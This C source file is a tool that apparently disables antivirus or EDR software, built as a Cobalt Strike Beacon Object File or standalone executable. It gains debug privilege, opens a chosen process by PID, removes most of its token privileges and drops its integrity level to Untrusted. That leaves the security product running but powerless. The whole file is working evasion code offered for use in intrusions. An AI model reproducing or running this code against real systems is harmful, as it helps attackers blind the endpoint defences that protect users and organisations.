#include "winfuncs.h"
#include "syscalls.h"

#ifdef BOF
#include "beacon.h"
#endif


BOOL SetPrivilege(HANDLE hToken, LPWSTR lpwsTokenName, BOOL bEnablePrivilege)
{
    TOKEN_PRIVILEGES tkp;
    LUID luid;
    NTSTATUS status;

    if (!ADVAPI32$LookupPrivilegeValueW(NULL, SE_DEBUG_NAME_W, &luid))
    {
        #ifdef BOF
        BeaconPrintf(CALLBACK_ERROR, "Failed to look up privilege");
        #else
        printf("[-] Failed to look up privilege\n");
        #endif

        NtClose(hToken);
        return FALSE;
    }
    
    tkp.PrivilegeCount = 1;
    tkp.Privileges[0].Luid = luid;
    
    
    if(bEnablePrivilege)
    {
        tkp.Privileges[0].Attributes = SE_PRIVILEGE_ENABLED;
    }
    else
    {
        tkp.Privileges[0].Attributes = SE_PRIVILEGE_REMOVED;
    }

    status = NtAdjustPrivilegesToken(hToken, FALSE, &tkp, sizeof(tkp), NULL, NULL);

    if (KERNEL32$GetLastError() == ERROR_NOT_ALL_ASSIGNED)
    {
        #ifndef BOF
        printf("[-] %S failed\n", lpwsTokenName);
        #endif
        return FALSE;
    }
    else
    {
        return TRUE;
    }
}

BOOL get_debug_priv() {
    // Credit: @anthemtotheego
    HANDLE hToken;
    TOKEN_PRIVILEGES tkp;
    NTSTATUS status = NtOpenProcessToken(NtCurrentProcess(), TOKEN_ALL_ACCESS, &hToken);

    if(status != STATUS_SUCCESS){
        #ifdef BOF
        BeaconPrintf(CALLBACK_ERROR, "Failed to open process token.");
        #else
        printf("[-] Failed to open process token.\n");
        #endif
        
        return FALSE;
    	
    }

    status = SetPrivilege(hToken, SE_DEBUG_NAME_W, TRUE);
    status &= SetPrivilege(hToken, SE_ASSIGNPRIMARYTOKEN_NAME_W, TRUE);
    NtClose(hToken);
    if(status && KERNEL32$GetLastError() != STATUS_SUCCESS) {
        #ifdef BOF
        BeaconPrintf(CALLBACK_ERROR, "Unable to get privs" );
        #else
        printf("[-] Unable to get privs %lx %d\n", status, KERNEL32$GetLastError());
        #endif

        return FALSE;
    }
    
    return TRUE;
}

BOOL sandbox_av(int pid) {
    HANDLE hProcess;
    HANDLE hProcToken;

    OBJECT_ATTRIBUTES objAttrs = { 0 };

    TOKEN_PRIVILEGES tkp;
    NTSTATUS status = 0;


    CLIENT_ID ciPid = {0};
    ciPid.UniqueProcess = ULongToHandle(pid);
    ciPid.UniqueThread = NULL;

    status = NtOpenProcess(&hProcess, PROCESS_QUERY_LIMITED_INFORMATION, &objAttrs, &ciPid);
    

    if (status != STATUS_SUCCESS && KERNEL32$GetLastError() != ERROR_SUCCESS)
    {
        #ifdef BOF
        BeaconPrintf(CALLBACK_ERROR, "OpenProcess failed");
        #else
        printf("[-] OpenProcess failed\n");
        #endif
    } else {
        #ifdef BOF
        BeaconPrintf(CALLBACK_OUTPUT, "[+] NtOpenProcess");
        #else
        printf("[+] NtOpenProcess\n");
        #endif
    }

    status = NtOpenProcessToken(hProcess, TOKEN_ALL_ACCESS, &hProcToken);

    if(status != STATUS_SUCCESS && KERNEL32$GetLastError() != ERROR_SUCCESS)
    {
        #ifdef BOF
        BeaconPrintf(CALLBACK_ERROR, "failed to open token handle %lx", status);
        #else
        printf("[-] failed to open token handle %lx\n", status);
        #endif
        return FALSE;
    }else{
        #ifndef BOF
        printf("[+] Opened token handle\n");
        #endif        
    }

    // enable DEBUG privs on token
    TOKEN_PRIVILEGES tkp2;
    LUID sedebug;
    ADVAPI32$LookupPrivilegeValueW(NULL, SE_DEBUG_NAME_W, &sedebug);

    tkp2.PrivilegeCount = 1;
    tkp2.Privileges[0].Luid = sedebug;
    tkp2.Privileges[0].Attributes = SE_PRIVILEGE_ENABLED;
    status = NtAdjustPrivilegesToken(hProcToken, FALSE, &tkp2, sizeof(tkp2), NULL, NULL);

    if (status != STATUS_SUCCESS && KERNEL32$GetLastError() != ERROR_SUCCESS) {
        #ifdef BOF
        BeaconPrintf(CALLBACK_ERROR, "Failed to Adjust Token's Privileges");
        #else
        printf("[-] Failed to Adjust Token's Privileges\n");
        #endif
        return FALSE;
    }

    status = TRUE;
    status &= SetPrivilege(hProcToken, SE_CHANGE_NOTIFY_NAME_W, FALSE);
    status &= SetPrivilege(hProcToken, SE_TCB_NAME_W, FALSE);
    status &= SetPrivilege(hProcToken, SE_IMPERSONATE_NAME_W, FALSE);
    status &= SetPrivilege(hProcToken, SE_LOAD_DRIVER_NAME_W, FALSE);
    status &= SetPrivilege(hProcToken, SE_RESTORE_NAME_W, FALSE);
    status &= SetPrivilege(hProcToken, SE_BACKUP_NAME_W, FALSE);
    status &= SetPrivilege(hProcToken, SE_SECURITY_NAME_W, FALSE);
    status &= SetPrivilege(hProcToken, SE_SYSTEM_ENVIRONMENT_NAME_W, FALSE);
    status &= SetPrivilege(hProcToken, SE_INCREASE_QUOTA_NAME_W, FALSE);
    status &= SetPrivilege(hProcToken, SE_TAKE_OWNERSHIP_NAME_W, FALSE);
    status &= SetPrivilege(hProcToken, SE_INC_BASE_PRIORITY_NAME_W, FALSE);
    status &= SetPrivilege(hProcToken, SE_SHUTDOWN_NAME_W, FALSE);
    status &= SetPrivilege(hProcToken, SE_ASSIGNPRIMARYTOKEN_NAME_W, FALSE);
    
    status &= SetPrivilege(hProcToken, SE_DEBUG_NAME_W, FALSE);
    
    if (status == TRUE)
    {
        #ifdef BOF
        BeaconPrintf(CALLBACK_OUTPUT, "[+] Privileges removed!");
        #else
        printf("[+] Privileges removed!\n");
        #endif
    } else {
        #ifdef BOF
        BeaconPrintf(CALLBACK_ERROR, "Something went wrong removing privileges, usually the sandboxing still works.");
        #else
        printf("[-] Something went wrong removing privileges\n");
        #endif
    }

    DWORD integrityLevel = SECURITY_MANDATORY_UNTRUSTED_RID;

    SID integrityLevelSid = {0};
    integrityLevelSid.Revision = SID_REVISION;
    integrityLevelSid.SubAuthorityCount = 1;
    integrityLevelSid.IdentifierAuthority.Value[5] = 16;
    integrityLevelSid.SubAuthority[0] = integrityLevel;

    TOKEN_MANDATORY_LABEL tokenIntegrityLevel = {0};
    tokenIntegrityLevel.Label.Attributes = SE_GROUP_INTEGRITY;
    tokenIntegrityLevel.Label.Sid = &integrityLevelSid;

    status = NtSetInformationToken(hProcToken, TokenIntegrityLevel, &tokenIntegrityLevel, sizeof(TOKEN_MANDATORY_LABEL) + ADVAPI32$GetLengthSid(&integrityLevelSid));
    if(status == STATUS_SUCCESS || KERNEL32$GetLastError() == ERROR_SUCCESS)
    {
        #ifdef BOF
        BeaconPrintf(CALLBACK_OUTPUT, "[+] SetTokenInformation succesful! Process is sandboxed.");
        #else
        printf("[+] SetTokenInformation succesful! Process is sandboxed.\n");
        #endif
    } else {
        #ifdef BOF
        BeaconPrintf(CALLBACK_ERROR, "SetTokenInformation failed");
        #else
        printf("[-] SetTokenInformation %d\n", KERNEL32$GetLastError());
        #endif
    }

    NtClose(hProcess);
    NtClose(hProcToken);

    return TRUE;
}


#ifdef BOF
int test = 2;
void go(char * args, int length) {
    datap parser;
    int pid;
    
    BeaconDataParse(&parser, args, length);

    pid = BeaconDataInt(&parser);
    
    BeaconPrintf(CALLBACK_OUTPUT, "[+] PID: %d", pid);
    
    if(get_debug_priv()) 
    {
        BeaconPrintf(CALLBACK_OUTPUT, "[+] Got seDebugPrivileges");        
        sandbox_av(pid);
    } 
    else 
    {
        BeaconPrintf(CALLBACK_ERROR, "[-] Unable to get debug privileges");
    }
}
#else
int main(int argc, char **argv)
{
    if (argc < 2)
    { 
        printf("Usage: sandbox.exe <pid>");
        return 1;
    }

    int pid = atoi(argv[1]);

    if(get_debug_priv())
    {
        printf("[+] Got DEBUG privs!\n");

        if(sandbox_av(pid))
        {
            printf("[+] SandboxAV succesful!\n");
        }
        else
        {
            printf("[-] SandboxAV failed\n");
        }
        
        return 0;
    } else {
        printf("[-] failed to get debug privs\n");

        return 1;
    }
}
#endif